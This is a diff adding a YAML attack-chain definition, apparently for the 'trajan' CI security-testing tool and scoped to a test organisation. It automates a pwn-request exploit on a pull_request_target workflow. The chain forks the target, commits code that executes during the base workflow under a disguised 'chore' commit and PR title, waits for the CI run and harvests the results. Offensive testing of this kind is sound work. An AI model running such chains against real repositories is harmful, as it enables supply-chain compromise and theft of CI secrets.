@@ -1,0 +1,61 @@
+apiVersion: trajan.attack/v1
+title: Pwn-request code execution
+rule: cat-01/prt-checkout-execute
+
+# pull_request_target runs the workflow DEFINITION from the base branch, so
+# committing a workflow to the fork is a no-op. We commit CODE the base workflow
+# already executes after checking out the PR head — hence commit.code, never
+# workflow.commit.
+#
+# No encryption: the seal brackets the steps of a job trajan composes, and this
+# chain composes none — the target's own workflow runs the file we commit. The
+# marker stream lands in the customer's run log in the clear, which the fragment
+# keeps free of secret values for that reason.
+
+scope: [ghektestorg/fr-01-03-prt-checkout-exec]
+identity: store:range-attacker
+
+inputs:
+  base_ref: { default: main, doc: branch the fork is cut from }
+
+steps:
+  - id: target
+    uses: repo.resolve
+    owner: ghektestorg
+    repo: fr-01-03-prt-checkout-exec
+
+  - id: fork
+    uses: repo.fork
+    repo: target
+
+  - id: branch
+    uses: ref.create
+    on: fork
+    name: chore/ci-matrix
+    from: base_ref
+
+  - id: exploit
+    uses: commit.code
+    on: branch
+    message: "chore: widen node matrix to 20.x"
+    template: t-07/checked-out-code-execution
+    params: { marker: prt-exec, vector: build_script, path: ci/matrix-helper.sh }
+
+  - id: pr
+    uses: pr.open
+    head: branch
+    base: target
+    title: "chore: widen node matrix"
+
+  - id: run
+    uses: run.await
+    workflow: .github/workflows/ci.yml
+
+  - id: loot
+    uses: run.harvest
+    on: run
+
+cleanup:
+  - { uses: pr.close, id: cleanup-pr, pr: pr }
+  - { uses: ref.delete, id: cleanup-branch, ref: branch }
+  - { uses: repo.delete, id: cleanup-fork, repo: fork }
